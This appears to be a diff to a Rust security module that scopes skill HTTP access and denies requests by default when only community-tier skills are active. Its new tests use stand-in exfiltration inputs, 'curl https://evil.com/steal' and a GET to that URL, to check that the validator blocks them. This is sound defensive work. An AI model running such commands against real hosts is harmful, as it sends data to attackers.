@@ -13,6 +13,12 @@
 //! - If **any** skill declares `[http]`, a request must match at least one skill's allowlist.
 //! - Union semantics: a URL is allowed if any active skill's scope permits it.
 //! - Community skills' `[http]` declarations are ignored (defense in depth).
+//! - If only Community skills are active, HTTP requests are denied by default.
+//!
+//! # Shell caveat
+//!
+//! Shell HTTP scoping is best-effort only. It inspects explicit `curl`/`wget`
+//! URL tokens and is not a hard sandbox for general shell networking.
 
 use std::fmt;
 
@@ -239,6 +245,8 @@ pub struct SkillHttpScopes {
     validators: Vec<SkillScope>,
     /// Whether any scoping is active (if false, all requests pass through).
     has_scopes: bool,
+    /// Whether a community skill is active.
+    community_active: bool,
 }
 
 struct SkillScope {
@@ -262,10 +270,12 @@ impl SkillHttpScopes {
     /// Community skills' `[http]` declarations are silently ignored.
     pub fn from_active_skills(skills: &[LoadedSkill]) -> Self {
         let mut validators = Vec::new();
+        let mut community_active = false;
 
         for skill in skills {
             // Defense in depth: ignore community skill HTTP declarations
             if skill.trust == SkillTrust::Community {
+                community_active = true;
                 if skill.manifest.http.is_some() {
                     tracing::warn!(
                         skill_name = skill.name(),
@@ -304,6 +314,7 @@ impl SkillHttpScopes {
         Self {
             validators,
             has_scopes,
+            community_active,
         }
     }
 
@@ -318,6 +329,15 @@ impl SkillHttpScopes {
         url: &str,
         method: &str,
     ) -> Result<Vec<&CredentialMapping>, HttpScopeError> {
+        if self.community_active && !self.has_scopes {
+            return Err(HttpScopeError::EndpointDenied {
+                url: url.to_string(),
+                method: method.to_string(),
+                reason: "community-tier skill active with no enforceable non-community HTTP scopes"
+                    .to_string(),
+            });
+        }
+
         if !self.has_scopes {
             return Ok(vec![]);
         }
@@ -355,9 +375,11 @@ impl SkillHttpScopes {
     /// Validate a shell command for HTTP access patterns.
     ///
     /// If the command uses `curl` or `wget` with a URL, validates the URL
-    /// against active skill scopes. Non-HTTP shell commands always pass.
+    /// against active skill scopes. This is best-effort only: shell-based
+    /// network access via interpreters, aliases, or indirection is not
+    /// comprehensively detected. Non-HTTP shell commands always pass.
     pub fn validate_shell_command(&self, command: &str) -> Result<(), HttpScopeError> {
-        if !self.has_scopes {
+        if !self.has_scopes && !self.community_active {
             return Ok(());
         }
 
@@ -509,7 +531,7 @@ mod tests {
     }
 
     #[test]
-    fn test_community_skill_scoping_ignored() {
+    fn test_community_skill_scoping_ignored_denies_by_default() {
         let community = make_skill(
             "sketchy-tool",
             SkillTrust::Community,
@@ -524,10 +546,11 @@ mod tests {
         );
         let scopes = SkillHttpScopes::from_active_skills(&[community]);
 
-        // Community skill's scope is ignored -- no scopes active means passthrough
+        // Community skill's scope is ignored -- and community-only now denies by default.
         assert!(!scopes.has_scopes);
+        assert!(scopes.community_active);
         let result = scopes.validate_http_request("https://evil.com/steal", "GET");
-        assert!(result.is_ok());
+        assert!(result.is_err());
     }
 
     #[test]
@@ -578,6 +601,26 @@ mod tests {
         assert!(result.is_err());
         let err = result.unwrap_err();
         assert!(matches!(err, HttpScopeError::ShellCommandDenied { .. }));
+    }
+
+    #[test]
+    fn test_shell_http_denied_for_community_only() {
+        let community = make_skill(
+            "sketchy-tool",
+            SkillTrust::Community,
+            Some(SkillHttpDeclaration {
+                endpoints: vec![SkillEndpointDeclaration {
+                    host: "evil.com".to_string(),
+                    path_prefix: None,
+                    methods: vec![],
+                }],
+                credentials: Default::default(),
+            }),
+        );
+        let scopes = SkillHttpScopes::from_active_skills(&[community]);
+
+        let result = scopes.validate_shell_command("curl https://evil.com/steal");
+        assert!(result.is_err());
     }
 
     #[test]
